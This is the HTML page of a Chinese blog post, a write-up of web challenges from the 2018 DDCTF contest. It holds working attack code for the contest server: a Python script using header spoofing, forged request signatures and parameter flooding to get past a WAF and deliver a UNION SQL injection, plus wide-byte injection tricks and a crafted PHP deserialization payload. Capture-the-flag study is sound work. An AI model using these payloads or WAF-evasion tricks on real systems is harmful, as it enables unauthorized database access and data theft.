@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          2018DDCTF writeup - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/04/2018ddctf-writeup/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>2018DDCTF writeup</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-04-23
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DDCTF实在被虐的有点惨，中途就放弃了（逃……）<br>只能赛后复现一下，不间断更新。。  </p>
+<h1 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h1><p>进入第一步是一个ip验证 <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/c0a87245327ee93d7c8c1c21197afb14.png" alt><br>用firefox的插件，添加一个x-forwarded-for 的header就行<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/5b30d8240a7b8cd83c41e4de5b88bc96.png" alt><br>进入之后是个简单的查询功能<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/43948467fe3bc1e665827a31c9bf563a.png" alt><br>任意查询之后发送给一个包，发现多了一个author参数<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/c0d4e8a8260a893bc5af2a195f1b52f3.png" alt><br>回到html页面，发现的确有这个隐藏的form值<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/a8dae9a6a2ec2271dd54afa74fb42991.png" alt><br>经过一些尝试之后发现如下几点<br>1、其他的非隐藏值都有被过滤，无法进行注入。但是对author进行<code>admin&#39;#</code> 和<code>admin&#39; and 1#</code>测试是发现存在注入<br>2、有安全狗拦截<br>3、不能进行任意发包，会对sig和time参数进行校验 接下来就是把关注点转移到被隐藏的author字段中，并绕过安全狗和前端校验 </p>
+<p>前端校验的代码主要在两个js文件中<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/c61c5742e3b6ae49ed7b71ee2832b38a.png" alt><br>math.js中主要是一些给main.js用的函数库，主要来看下main.js<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/4393d7fd936e2fda851a771d184d9904.png" alt><br>进行了js混淆，在网上找个在线的就可以还原，还原代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span><span class="params">(obj, key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> (i in obj) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i != <span class="string">'sign'</span>) &#123;</span><br><span class="line">			str1 = <span class="string">''</span>;</span><br><span class="line">			str1 = i + <span class="string">'='</span> + obj[i];</span><br><span class="line">			str0 += str1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hex_math_enc(str0 + key)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	id: <span class="string">''</span>,</span><br><span class="line">	title: <span class="string">''</span>,</span><br><span class="line">	author: <span class="string">''</span>,</span><br><span class="line">	date: <span class="string">''</span>,</span><br><span class="line">	time: parseInt(<span class="keyword">new</span> Date().getTime() / <span class="number">1000</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	obj[<span class="string">'id'</span>] = document.getElementById(<span class="string">'id'</span>).value;</span><br><span class="line">	obj[<span class="string">'title'</span>] = document.getElementById(<span class="string">'title'</span>).value;</span><br><span class="line">	obj[<span class="string">'author'</span>] = document.getElementById(<span class="string">'author'</span>).value;</span><br><span class="line">	obj[<span class="string">'date'</span>] = document.getElementById(<span class="string">'date'</span>).value;</span><br><span class="line">	<span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line">	document.getElementById(<span class="string">'queryForm'</span>).action = <span class="string">"index.php?sig="</span> + sign + <span class="string">"&amp;time="</span> + obj.time;</span><br><span class="line">	document.getElementById(<span class="string">'queryForm'</span>).submit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看到是对传递的参数进行加密，生成sign和time后再进行发送 这里要调用一个python的execjs库，来调用JavaScript代码，生成sign和time值（不得不说一句，python是有点强） 对main.js函数改造一下，返回获取sign和time值的函数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_sig</span>(<span class="params">id,title,author,date</span>) </span>&#123;</span><br><span class="line"> obj[<span class="string">'id'</span>] = id;</span><br><span class="line"> obj[<span class="string">'title'</span>] = title;</span><br><span class="line"> obj[<span class="string">'author'</span>] = author;</span><br><span class="line"> obj[<span class="string">'date'</span>] = date;</span><br><span class="line"> <span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line"> <span class="keyword">return</span> sign;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_time</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> obj.time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>还有一点就是，绕过安全狗<br>参照大佬的一招——参数溢出 <a href="https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri参数溢出漏洞.md" target="_blank" rel="noopener">https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri参数溢出漏洞.md</a><br>大致意思就是说传递的参数过多时，会放弃对后面参数的检测 最后，python发包的代码如下的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> execjs, requests</span><br><span class="line"></span><br><span class="line">_id = <span class="string">""</span></span><br><span class="line">title =<span class="string">""</span></span><br><span class="line">author = <span class="string">"admin' union select (select column_name from information_schema.columns where table_name='ctf_key7' limit 0,1),(select secvalue from ctf_key7 limit 0,1),(database()),(select table_name from information_schema.tables where table_schema='ddctf' limit 0,1),5 #"</span></span><br><span class="line">date = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test.js"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	js = f.read()</span><br><span class="line"></span><br><span class="line">func = execjs.compile(js)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'UBD'</span>:<span class="string">'rS'</span>,</span><br><span class="line">	<span class="string">'sgh'</span>:<span class="string">'N5'</span>,</span><br><span class="line">	<span class="string">'ytV'</span>:<span class="string">'52'</span>,</span><br><span class="line">	<span class="string">'htx'</span>:<span class="string">'s6'</span>,</span><br><span class="line">         ……（省略一百个）</span><br><span class="line">	<span class="string">'3Em'</span>:<span class="string">'Og'</span>,</span><br><span class="line">	<span class="string">'xZO'</span>:<span class="string">'cJ'</span>,</span><br><span class="line">	<span class="string">'ceX'</span>:<span class="string">'OF'</span>,</span><br><span class="line">	<span class="string">'eTu'</span>:<span class="string">'an'</span>,</span><br><span class="line">	<span class="string">'5pc'</span>:<span class="string">'b6'</span>,</span><br><span class="line">	</span><br><span class="line">	<span class="string">'id'</span> : _id,</span><br><span class="line">	<span class="string">'title'</span> : title,</span><br><span class="line">	<span class="string">'author'</span> : author,</span><br><span class="line">	<span class="string">'date'</span> : date</span><br><span class="line">&#125;</span><br><span class="line">sig = func.call(<span class="string">'get_sig'</span>,_id,title,author,date)</span><br><span class="line">time = func.call(<span class="string">'get_time'</span>)</span><br><span class="line">url = <span class="string">"http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php?sig=&#123;&#125;&amp;time=&#123;&#125;"</span>.format(sig,time)</span><br><span class="line">r = requests.post(url,data=data,headers=headers)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"dd.html"</span>,<span class="string">"w+"</span>,encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(r.text)</span><br><span class="line">print(<span class="string">"ok"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>调用js文件，生成对应的sign和time，然后发送对应的数据包，将返回的页面保存到本地html中，便于观察，此处直接用union注入就行<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/96880c7df2d643a2e21fb423cc76703c.png" alt>    </p>
+<h1 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h1><p>java才刚开始学语法，里面一些加密算法实在有些看不懂，先占个位……  </p>
+<h1 id="注入的奥妙"><a href="#注入的奥妙" class="headerlink" title="注入的奥妙"></a>注入的奥妙</h1><p>进去是一个简单的查询功能，题目都说了注入了，先试下注入<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/e3861fd6a104024602b3722a4ef3f57b.png" alt><br>发现被转义，提示页面编码设置 查看源码发现一个奇怪的注释链接，进去之后是一个编码表的链接<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/71b1e517cf4e55713ed70e60f0c98849.png" alt><br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/914ab831359c25aa053496c7f7508604.png" alt><br>emm，应该是宽字节注入 挑一个5c结尾的字符（%5c转义后为 \），就可以成功闭合转义单引号前面的反斜杠<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/811927a704ac2945f5c9a27e355cbf78.png" alt><br>接下来就可以进行注入了，union被过滤双写即可<br>重点在一个route_rules的表中<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/5646e40b98333efc3566b9818128a8b5.png" alt><br>先下载<code>static/bootstrap/css/backup.css</code>这个文件，改成.zip后缀解压即可得到备份文件<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/37750051bee93efaf40547758fb7c21d.png" alt><br>然后就是一波辛酸的代码审计（路由配置有点迷。。）<br>Test.php中有个很明显的反序列化漏洞<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/1a26f75d027371fb9776e53454ca54e4.png" alt><br>触发反序列化的类在Justtry.php中<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/0deaf1177229345c2b71640e6a8e44d9.png" alt><br>主要还是路由配置。这里就不多分析了<br>主要是dispath调用checkurl传递参数给param数组，然后调用invoke函数进行对应类下对应函数的调用<br>这里主要就是justtry.try函数，在数据库的路由配置中也明显能看出<br>接下来就是构造反序列化的对象<br>test类中的uuid即为自己的uuid，fl是一个Flag对象，Flag对象中需要一个SQL对象才能调用对应的sql语句输出flag，构造代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    	<span class="class"><span class="keyword">Class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="class"><span class="keyword">Class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="class"><span class="keyword">Class</span> <span class="title">SQL</span></span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    $t = <span class="keyword">new</span> Test() ;</span><br><span class="line">    $t-&gt;user_uuid = <span class="string">"5d71b644-ee63-4b11-9c13-da3c4ac35b8d"</span>;  <span class="comment">//自己的uuid</span></span><br><span class="line">    $t-&gt;fl = <span class="keyword">new</span> Flag();</span><br><span class="line">    $t-&gt;fl-&gt;sql = <span class="keyword">new</span> SQL();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> serialize($t);</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"user_uuid"</span>;s:<span class="number">36</span>:<span class="string">"5d71b644-ee63-4b11-9c13-da3c4ac35b8d"</span>;s:<span class="number">2</span>:<span class="string">"fl"</span>;O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"sql"</span>;O:<span class="number">3</span>:<span class="string">"SQL"</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是反序列化函数中做了一点点小小的限定<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/a573d641f508ade2a931fee7bb71a6d0.png" alt><br>做一点小小的改动<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:17</span><span class="selector-pseudo">:"Index</span>\<span class="selector-tag">Helper</span>\<span class="selector-tag">Test</span>"<span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"user_uuid"</span>;<span class="attribute">s</span>:<span class="number">36</span>:<span class="string">"5d71b644-ee63-4b11-9c13-da3c4ac35b8d"</span>;<span class="attribute">s</span>:<span class="number">2</span>:<span class="string">"fl"</span>;<span class="attribute">O</span>:<span class="number">17</span>:<span class="string">"Index\Helper\Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"sql"</span>;<span class="attribute">O</span>:<span class="number">16</span>:<span class="string">"Index\Helper\SQL"</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在justtry/try页面中post改数据即可<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/0473786c474654fc71e5dbced65b712f.png" alt></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/05/一个从零开始的mvc/" data-toggle="tooltip" data-placement="top" title="一个从零开始的mvc">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/04/bctf2018-love-q/" data-toggle="tooltip" data-placement="top" title="BCTF2018 LOVE Q">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
